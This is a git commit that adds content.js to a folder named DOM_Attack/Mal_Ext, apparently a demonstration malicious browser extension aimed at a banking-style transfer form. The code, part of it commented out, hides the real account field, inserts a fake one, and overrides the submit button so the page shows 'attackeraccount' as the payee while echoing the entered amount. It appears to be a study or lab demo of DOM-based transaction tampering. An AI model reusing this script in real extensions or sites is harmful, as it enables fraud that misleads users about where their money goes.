ed79691840c0c02a26691a87404e6b82745629f4
Vineeth1910 <vineethsai1910@gmail.com>
2021-04-05 11:56:43 +0530

    Add files via upload

---
+++ DOM_Attack/Mal_Ext/content.js
@@ -0,0 +1,18 @@
+/*var tbox = document.createElement("input");
+tbox.setAttribute("type", "text");
+tbox.setAttribute("value", "");
+tbox.setAttribute("name", "FakeAccnumber");
+tbox.setAttribute("size", "20");
+var formvar = document.getElementById("formid");
+var rbox = document.getElementById("AccountNo");
+rbox.setAttribute("type","hidden");
+rbox.setAttribute("value", "attackeraccount");
+formvar.appendChild(tbox);*/
+
+document.getElementById("SubmitButton").onclick = function attackerOnclick(){
+	//var inp1 = document.getElementById("AccountNo").value;
+	var inp2 = document.getElementById("Amount").value;
+	document.getElementById("acno").innerHTML="attackeraccount";
+	document.getElementById("amt").innerHTML=inp2;
+	console.log("running");
+}
